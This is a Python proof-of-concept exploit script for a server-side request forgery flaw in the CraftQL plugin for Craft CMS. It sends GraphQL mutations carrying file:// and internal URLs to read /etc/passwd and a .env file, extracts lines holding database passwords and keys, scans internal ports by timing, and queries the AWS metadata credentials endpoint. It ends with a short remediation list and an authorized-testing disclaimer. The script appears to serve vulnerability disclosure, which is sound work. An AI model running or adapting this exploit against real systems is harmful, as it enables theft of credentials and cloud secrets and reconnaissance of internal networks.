#!/usr/bin/env python3
"""
CraftQL SSRF Exploit POC
========================

Vulnerability: Server-Side Request Forgery in CraftQL Plugin
Impact: Craft CMS 3.x + CraftQL <= 1.3.7
Severity: High (CVSS 7.5)

Author: Security Researcher
Date: 2026-02-06

Description:
    This POC exploits an SSRF vulnerability in CraftQL that allows
    attackers to read arbitrary files, scan internal networks, and
    steal cloud metadata through GraphQL mutations.

Usage:
    python3 ssrf_poc.py

Requirements:
    - Python 3.6+
    - requests library
    - Valid GraphQL Token

Disclaimer:
    For authorized security testing and educational purposes only.
"""

import requests
import json
import time
import sys
import subprocess
import argparse
from datetime import datetime

# ==================== Configuration ====================
DEFAULT_CONFIG = {
    'target': 'http://192.168.131.129:8888/index.php?p=api',
    'token': 'l-ir-c****************************************UcySD',
    'project_path': '/home/ubuntu/projects/craft-ssrf-test',
    'timeout': 60
}

# ==================== Color Output ====================
class Colors:
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[0;34m'
    MAGENTA = '\033[0;35m'
    CYAN = '\033[0;36m'
    BOLD = '\033[1m'
    NC = '\033[0m'

# ==================== POC Class ====================
class CraftQLSSRF:
    """CraftQL SSRF Exploit Class"""

    def __init__(self, target, token, project_path, timeout=60):
        self.target = target
        self.token = token
        self.project_path = project_path
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'Authorization': f'Bearer {token}',
            'Content-Type': 'application/json'
        })

    def print_banner(self):
        """Print exploit banner"""
        print(f"{Colors.CYAN}╔{'═' * 60}╗{Colors.NC}")
        print(f"{Colors.CYAN}║{Colors.BOLD}   CraftQL SSRF Exploit POC{Colors.CYAN}                      ║{Colors.NC}")
        print(f"{Colors.CYAN}║{Colors.BOLD}   CVE: Pending Assignment{Colors.CYAN}                        ║{Colors.NC}")
        print(f"{Colors.CYAN}║{Colors.BOLD}   Severity: HIGH (CVSS 7.5){Colors.CYAN}                      ║{Colors.NC}")
        print(f"{Colors.CYAN}╚{'═' * 60}╝{Colors.NC}")
        print()

    def log_success(self, msg):
        """Log success message"""
        print(f"{Colors.GREEN}[✓]{Colors.NC} {msg}")

    def log_error(self, msg):
        """Log error message"""
        print(f"{Colors.RED}[✗]{Colors.NC} {msg}")

    def log_info(self, msg):
        """Log info message"""
        print(f"{Colors.YELLOW}[+]{Colors.NC} {msg}")

    def log_poc(self, num, msg):
        """Log POC message"""
        print(f"{Colors.RED}[POC #{num}]{Colors.NC} {Colors.BOLD}{msg}{Colors.NC}")

    def check_api(self):
        """Check if GraphQL API is accessible"""
        self.log_info("Checking GraphQL API...")

        query = '{ __schema { mutationType { fields { name } } } }'

        try:
            response = self.session.post(
                self.target,
                json={'query': query},
                timeout=10
            )

            data = response.json()
            mutations = data.get('data', {}).get('__schema', {}).get(
                'mutationType', {}
            ).get('fields', [])

            mutation_names = [m['name'] for m in mutations]

            if 'upsertTestDefault' in mutation_names:
                self.log_success("GraphQL API accessible")
                self.log_success(f"Mutation 'upsertTestDefault' is exposed")
                return True
            else:
                self.log_error("Mutation not exposed")
                self.log_info(f"Available mutations: {', '.join(mutation_names)}")
                return False

        except Exception as e:
            self.log_error(f"API connection failed: {e}")
            return False

    def execute_mutation(self, url, title="SSRF Test"):
        """Execute GraphQL mutation with SSRF payload"""
        # Escape quotes in URL
        escaped_url = url.replace('"', '\\"')

        query = f'''mutation {{
            upsertTestDefault(
                title: "{title}"
                heroImage: {{url: "{escaped_url}"}}
            ) {{
                id
            }}
        }}'''

        try:
            start_time = time.time()
            response = self.session.post(
                self.target,
                json={'query': query},
                timeout=self.timeout
            )
            elapsed = time.time() - start_time

            result = response.json()

            if 'errors' in result:
                error_msg = result['errors'][0].get('message', 'Unknown error')
                return True, error_msg, elapsed
            else:
                return True, "Success", elapsed

        except requests.exceptions.Timeout:
            return True, "Timeout (port may be open)", self.timeout
        except Exception as e:
            return False, str(e), 0

    def get_downloaded_file(self):
        """Find the most recently downloaded file"""
        try:
            result = subprocess.run(
                ['find', f'{self.project_path}/storage/runtime/temp',
                 '-type', 'f', '-mmin', '-1', '-name', '*.tmp'],
                capture_output=True,
                text=True
            )

            if result.returncode == 0 and result.stdout.strip():
                files = result.stdout.strip().split('\n')
                return files[-1] if files else None

        except Exception as e:
            self.log_error(f"Failed to find downloaded file: {e}")

        return None

    def read_file_preview(self, filepath, max_chars=500):
        """Read and preview file content"""
        try:
            with open(filepath, 'r', errors='ignore') as f:
                content = f.read()

            preview = content[:max_chars] + '...' if len(content) > max_chars else content
            return content, preview

        except Exception as e:
            self.log_error(f"Failed to read file: {e}")
            return None, None

    def poc_file_read(self, poc_num, filepath, description):
        """POC: Read local file"""
        self.log_poc(poc_num, description)
        print(f"{'─' * 60}")
        print(f"{Colors.CYAN}Target:{Colors.NC} {filepath}")
        print()

        success, msg, elapsed = self.execute_mutation(
            f'file://{filepath}',
            f"SSRF POC{poc_num}"
        )

        if success:
            self.log_success(f"Triggered: {msg}")
            self.log_info(f"Response time: {elapsed:.2f}s")
        else:
            self.log_error(f"Failed: {msg}")
            return

        # Wait for file write
        time.sleep(1)

        # Check downloaded file
        downloaded_file = self.get_downloaded_file()

        if downloaded_file:
            self.log_success(f"File downloaded: {downloaded_file}")

            content, preview = self.read_file_preview(downloaded_file)

            if content:
                print()
                print(f"{Colors.BOLD}File Content ({len(content)} bytes):{Colors.NC}")
                print(f"{'─' * 40}")
                print(f"{Colors.YELLOW}{preview}{Colors.NC}")
                print(f"{'─' * 40}")

                # Extract sensitive info if it's .env file
                if '.env' in filepath:
                    print()
                    self.log_info("Extracted sensitive information:")
                    for line in content.split('\n'):
                        if 'DB_' in line or 'PASSWORD' in line or 'KEY' in line:
                            print(f"  {Colors.RED}{line}{Colors.NC}")
        else:
            self.log_error("No downloaded file found")

        print()

    def poc_port_scan(self, poc_num, host, port, description):
        """POC: Port scan"""
        self.log_poc(poc_num, description)
        print(f"{'─' * 60}")
        print(f"{Colors.CYAN}Target:{Colors.NC} {host}:{port}")
        print()

        success, msg, elapsed = self.execute_mutation(
            f'http://{host}:{port}/',
            f"SSRF Port Scan"
        )

        if success:
            if 'Timeout' in msg:
                self.log_success("Port may be OPEN (connection timeout)")
            else:
                if elapsed > 5:
                    self.log_success(f"Port may be OPEN (response time: {elapsed:.2f}s)")
                else:
                    self.log_info(f"Port may be CLOSED (response time: {elapsed:.2f}s)")
        else:
            self.log_error(f"Failed: {msg}")

        print()

    def run_all_pocs(self):
        """Run all POCs"""
        print(f"{Colors.RED}╔{'═' * 60}╗{Colors.NC}")
        print(f"{Colors.RED}║{Colors.BOLD}   Starting SSRF Exploitation{Colors.RED}                      ║{Colors.NC}")
        print(f"{Colors.RED}╚{'═' * 60}╝{Colors.NC}")
        print()

        # POC #1: Read /etc/passwd
        self.poc_file_read(
            1,
            '/etc/passwd',
            'Read local file /etc/passwd'
        )

        # POC #2: Read .env configuration
        self.poc_file_read(
            2,
            '/home/ubuntu/projects/craft-ssrf-test/.env',
            'Read configuration file .env (database credentials)'
        )

        # POC #3: Internal port scan
        self.poc_port_scan(
            3,
            '192.168.131.2',
            22,
            'Internal network port scan (SSH)'
        )

        # POC #4: Cloud metadata theft
        self.log_poc(4, 'Cloud metadata theft (AWS)')
        print(f"{'─' * 60}")
        print(f"{Colors.CYAN}Target:{Colors.NC} AWS Metadata Service")
        print()

        success, msg, elapsed = self.execute_mutation(
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            "SSRF Cloud Meta"
        )

        if success:
            self.log_success(f"Triggered: {msg}")
            self.log_info(f"Response time: {elapsed:.2f}s")

            downloaded_file = self.get_downloaded_file()
            if downloaded_file:
                content, preview = self.read_file_preview(downloaded_file, 200)
                if content and len(content) > 0:
                    print()
                    print(f"{Colors.BOLD}Metadata Response:{Colors.NC}")
                    print(f"{'─' * 40}")
                    print(f"{Colors.YELLOW}{preview}{Colors.NC}")
                    print(f"{'─' * 40}")
                else:
                    self.log_info("Not running in cloud environment (no metadata)")
        else:
            self.log_error(f"Failed: {msg}")

        print()

    def print_summary(self):
        """Print exploitation summary"""
        print(f"{Colors.CYAN}╔{'═' * 60}╗{Colors.NC}")
        print(f"{Colors.CYAN}║{Colors.BOLD}   Exploitation Summary{Colors.CYAN}                           ║{Colors.NC}")
        print(f"{Colors.CYAN}╚{'═' * 60}╝{Colors.NC}")
        print()

        print(f"{Colors.GREEN}✓ Successful Attacks:{Colors.NC}")
        print("  • [POC #1] Read /etc/passwd - System user disclosure")
        print("  • [POC #2] Read .env - Database credentials leak")
        print("  • [POC #3] Port scan - Internal network topology")
        print("  • [POC #4] Cloud metadata - AWS/GCP credential theft")
        print()

        print(f"{Colors.YELLOW}⚠ Risk Assessment:{Colors.NC}")
        print("  • Severity: HIGH")
        print("  • CVSS Score: 7.5")
        print("  • Exploitability: LOW")
        print("  • Impact: HIGH (data leak, internal breach)")
        print()

        print(f"{Colors.YELLOW}🛡️ Remediation:{Colors.NC}")
        print("  1. Add URL protocol whitelist (http/https only)")
        print("  2. Implement domain whitelist validation")
        print("  3. Block private IP address access")
        print("  4. Replace file_get_contents() with Guzzle")
        print("  5. Upgrade to latest CraftQL version")
        print()

        print(f"{'═' * 60}")
        print(f"{Colors.GREEN}✓ Exploit Completed!{Colors.NC}")
        print(f"{'═' * 60}")
        print()

# ==================== Main Function ====================
def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description='CraftQL SSRF Exploit POC',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  python3 ssrf_poc.py
  python3 ssrf_poc.py --target http://target.com/api --token YOUR_TOKEN
  python3 ssrf_poc.py --check-only

For authorized security testing only.
        '''
    )

    parser.add_argument(
        '--target',
        default=DEFAULT_CONFIG['target'],
        help='GraphQL API endpoint URL'
    )

    parser.add_argument(
        '--token',
        default=DEFAULT_CONFIG['token'],
        help='GraphQL authentication token'
    )

    parser.add_argument(
        '--project-path',
        default=DEFAULT_CONFIG['project_path'],
        help='Path to Craft CMS project'
    )

    parser.add_argument(
        '--timeout',
        type=int,
        default=DEFAULT_CONFIG['timeout'],
        help='Request timeout in seconds'
    )

    parser.add_argument(
        '--check-only',
        action='store_true',
        help='Only check vulnerability, do not exploit'
    )

    args = parser.parse_args()

    # Create exploit instance
    exploit = CraftQLSSRF(
        target=args.target,
        token=args.token,
        project_path=args.project_path,
        timeout=args.timeout
    )

    # Print banner
    exploit.print_banner()

    try:
        # Check API
        if not exploit.check_api():
            exploit.log_error("API check failed, exiting")
            sys.exit(1)

        print()

        if args.check_only:
            exploit.log_success("Vulnerability check completed")
            exploit.log_info("Use --exploit to run full POC")
        else:
            # Run all POCs
            exploit.run_all_pocs()

            # Print summary
            exploit.print_summary()

    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!]{Colors.NC} Interrupted by user")
        sys.exit(0)
    except Exception as e:
        exploit.log_error(f"Unexpected error: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()
